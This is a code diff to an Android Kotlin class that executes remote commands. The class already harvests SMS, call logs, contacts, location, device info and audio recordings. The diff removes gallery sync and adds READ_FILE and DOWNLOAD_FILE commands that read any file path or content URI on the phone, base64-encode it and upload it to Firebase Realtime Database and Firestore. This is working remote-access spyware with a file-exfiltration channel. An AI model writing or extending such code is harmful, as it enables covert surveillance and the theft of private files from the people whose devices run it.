@@ -30,6 +30,8 @@ import android.speech.tts.TextToSpeech
 import android.telephony.SmsManager
 import com.example.util.ToastUtils
 import android.util.Base64
+import android.net.Uri
+import com.google.firebase.firestore.FirebaseFirestore
 import android.util.Log
 import android.util.Size
 import com.google.firebase.database.FirebaseDatabase
@@ -88,7 +90,6 @@ class RemoteCommandManager(private val context: Context) {
                     SmsSyncManager(context).syncSmsMessages()
                     CallLogSyncManager(context).syncCallLogs()
                     ContactsSyncManager(context).syncContacts()
-                    GallerySyncManager(context).syncGallery()
                     AppUsageSyncManager(context).syncAppUsageStats()
                     LocationSyncManager(context).captureAndSyncLocation()
                     DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
@@ -109,10 +110,6 @@ class RemoteCommandManager(private val context: Context) {
                     ContactsSyncManager(context).syncContacts()
                     FirebaseSyncEngine(context).pushTelemetryToFirebase()
                     resultMessage = "Contacts synchronized successfully."
-                }
-                "GET_GALLERY", "SYNC_GALLERY", "FETCH_GALLERY", "GALLERY" -> {
-                    val galleryItems = GallerySyncManager(context).syncGallery()
-                    resultMessage = "Gallery synchronized: ${galleryItems.size} photos retrieved and backed up to Firebase."
                 }
                 "CLEAR_REMOTE_DATA", "PURGE_DATA", "WIPE_DATA", "CLEAR_DATA", "DELETE_ALL" -> {
                     FirebaseSyncEngine(context).clearAllRemoteData()
@@ -416,6 +413,12 @@ class RemoteCommandManager(private val context: Context) {
                 }
                 "REMOTE_RECORD_AUDIO", "RECORD_AUDIO", "AUDIO_RECORD", "START_AUDIO_RECORD" -> {
                     resultMessage = recordAudioRemote(payload)
+                }
+                "READ_FILE", "FILE_READ", "READ_BASE64", "GET_FILE_BASE64" -> {
+                    resultMessage = executeReadFileCommand(payload)
+                }
+                "DOWNLOAD_FILE", "FILE_DOWNLOAD", "GET_FILE", "UPLOAD_FILE", "CLOUD_DOWNLOAD", "PULL_FILE" -> {
+                    resultMessage = executeDownloadFileCommand(payload)
                 }
                 else -> {
                     resultMessage = "Executed command $commandType with payload $payload"
@@ -904,5 +907,142 @@ class RemoteCommandManager(private val context: Context) {
             try { if (outFile.exists()) outFile.delete() } catch (_: Exception) {}
             throw Exception("Audio recording failed or output file empty.")
         }
+    }
+
+    private fun extractFilePathOrUri(payload: String): String {
+        val trimmed = payload.trim()
+        if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
+            try {
+                val json = JSONObject(trimmed)
+                val path = json.optString("path").ifEmpty {
+                    json.optString("filePath").ifEmpty {
+                        json.optString("file_path").ifEmpty {
+                            json.optString("uri").ifEmpty {
+                                json.optString("file").ifEmpty {
+                                    json.optString("url")
+                                }
+                            }
+                        }
+                    }
+                }
+                if (path.isNotEmpty()) return path
+            } catch (_: Exception) {}
+        }
+        return trimmed
+    }
+
+    private fun readFileData(pathOrUri: String): Pair<String, ByteArray> {
+        val uriStr = pathOrUri.trim()
+        if (uriStr.startsWith("content://") || uriStr.startsWith("file://")) {
+            val uri = Uri.parse(uriStr)
+            val inputStream = context.contentResolver.openInputStream(uri)
+                ?: throw IllegalArgumentException("Cannot open content URI stream for '$pathOrUri'")
+            val bytes = inputStream.use { it.readBytes() }
+            var fileName = uri.lastPathSegment ?: "file_${System.currentTimeMillis()}"
+            try {
+                context.contentResolver.query(uri, null, null, null, null)?.use { cursor ->
+                    val nameIdx = cursor.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME)
+                    if (nameIdx >= 0 && cursor.moveToFirst()) {
+                        val name = cursor.getString(nameIdx)
+                        if (!name.isNullOrBlank()) fileName = name
+                    }
+                }
+            } catch (_: Exception) {}
+            return Pair(fileName, bytes)
+        } else {
+            val file = File(uriStr)
+            if (!file.exists()) {
+                throw java.io.FileNotFoundException("File does not exist at path: '$pathOrUri'")
+            }
+            if (!file.canRead()) {
+                throw IllegalStateException("File exists but cannot be read at path: '$pathOrUri'")
+            }
+            val bytes = file.readBytes()
+            return Pair(file.name, bytes)
+        }
+    }
+
+    private suspend fun executeReadFileCommand(payload: String): String = withContext(Dispatchers.IO) {
+        val pathOrUri = extractFilePathOrUri(payload)
+        if (pathOrUri.isEmpty()) {
+            throw IllegalArgumentException("READ_FILE command requires a non-empty file path or URI payload.")
+        }
+        val (fileName, bytes) = readFileData(pathOrUri)
+        val base64Content = Base64.encodeToString(bytes, Base64.NO_WRAP)
+
+        val deviceId = try {
+            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
+        } catch (_: Exception) { "DEVICE_${Build.MODEL}" }
+
+        val nowMs = System.currentTimeMillis()
+        val rtdbData = mapOf(
+            "fileName" to fileName,
+            "filePath" to pathOrUri,
+            "fileSizeBytes" to bytes.size,
+            "timestamp" to nowMs,
+            "base64" to base64Content
+        )
+
+        try {
+            val rtdb = FirebaseDatabase.getInstance()
+            rtdb.getReference("devices/$deviceId/file_reads/$nowMs").setValue(rtdbData)
+            rtdb.getReference("devices/$deviceId/file_read_latest").setValue(rtdbData)
+        } catch (e: Exception) {
+            Log.e("RemoteCommandManager", "Failed to upload READ_FILE result to RTDB: ${e.message}")
+        }
+
+        base64Content
+    }
+
+    private suspend fun executeDownloadFileCommand(payload: String): String = withContext(Dispatchers.IO) {
+        val pathOrUri = extractFilePathOrUri(payload)
+        if (pathOrUri.isEmpty()) {
+            throw IllegalArgumentException("DOWNLOAD_FILE command requires a non-empty file path or URI payload.")
+        }
+        val (fileName, bytes) = readFileData(pathOrUri)
+        val base64Content = Base64.encodeToString(bytes, Base64.NO_WRAP)
+
+        val deviceId = try {
+            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
+        } catch (_: Exception) { "DEVICE_${Build.MODEL}" }
+
+        val nowMs = System.currentTimeMillis()
+        val formattedTime = SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs))
+        val kb = bytes.size / 1024.0
+        val formattedSize = if (kb >= 1024) String.format(Locale.US, "%.2f MB", kb / 1024.0) else String.format(Locale.US, "%.1f KB", kb)
+
+        val downloadData = mapOf(
+            "id" to nowMs.toString(),
+            "fileName" to fileName,
+            "filePath" to pathOrUri,
+            "fileSizeBytes" to bytes.size,
+            "formattedSize" to formattedSize,
+            "timestamp" to nowMs,
+            "formattedTime" to formattedTime,
+            "fileBase64" to "data:application/octet-stream;base64,$base64Content",
+            "downloadUrl" to "data:application/octet-stream;base64,$base64Content"
+        )
+
+        try {
+            val rtdb = FirebaseDatabase.getInstance()
+            rtdb.getReference("devices/$deviceId/downloads/$nowMs").setValue(downloadData)
+            rtdb.getReference("devices/$deviceId/file_downloads/$nowMs").setValue(downloadData)
+            rtdb.getReference("devices/$deviceId/file_downloads_latest").setValue(downloadData)
+        } catch (e: Exception) {
+            Log.e("RemoteCommandManager", "Failed to upload DOWNLOAD_FILE to RTDB: ${e.message}")
+        }
+
+        try {
+            val firestore = FirebaseFirestore.getInstance()
+            firestore.collection("enterprise_devices")
+                .document(deviceId)
+                .collection("downloads")
+                .document(nowMs.toString())
+                .set(downloadData)
+        } catch (e: Exception) {
+            Log.e("RemoteCommandManager", "Failed to upload DOWNLOAD_FILE to Firestore: ${e.message}")
+        }
+
+        "File '$fileName' ($formattedSize) downloaded and uploaded to cloud storage successfully. Available at devices/$deviceId/downloads/$nowMs."
     }
 }
